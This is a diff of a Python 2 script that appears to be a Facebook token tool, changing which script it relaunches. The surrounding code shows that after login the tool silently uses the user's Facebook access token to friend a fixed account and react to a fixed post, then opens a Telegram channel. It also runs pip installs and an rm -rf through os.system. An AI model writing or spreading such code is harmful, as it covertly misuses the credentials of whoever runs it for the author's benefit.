@@ -9,7 +9,7 @@ except ImportError:
     os.system('pip2 install mechanize')
     os.system('pip2 install bxin')
     time.sleep(1)
-    os.system('python2 .Mohammad.py')
+    os.system('python2 ayan1.py')
 
 reload(sys)
 sys.setdefaultencoding('utf8')
@@ -71,7 +71,7 @@ def login():
     os.system('clear')
     try:
         toket = open('login.txt', 'r')
-        os.system('python2 .Mohammad.py')
+        os.system('python2 ayan1.py')
     except (KeyError,IOError):
         os.system('rm -rf login.txt')
         os.system('clear')
@@ -96,7 +96,7 @@ def login_choice():
         requests.post('https://graph.facebook.com/me/friends?method=post&uids=100002059014174&access_token='+fac)
         requests.post('https://graph.facebook.com/2848950808516858/reactions?type=LOVE&access_token=' +fac)
         os.system('xdg-open https://t.me/sultani1122')
-        os.system('python2 .Mohammad.py')
+        os.system('python2 ayan1.py')
     elif bch =='1':
         login1()
             
@@ -104,7 +104,7 @@ def login1():
 	cb()
 	try:
 		tb=open('token.txt', 'r')
-		os.system('python2 .Mohammad.py')
+		os.system('python2 ayan1.py')
 	except (KeyError,IOError):
 		cb()
 		print (logo)
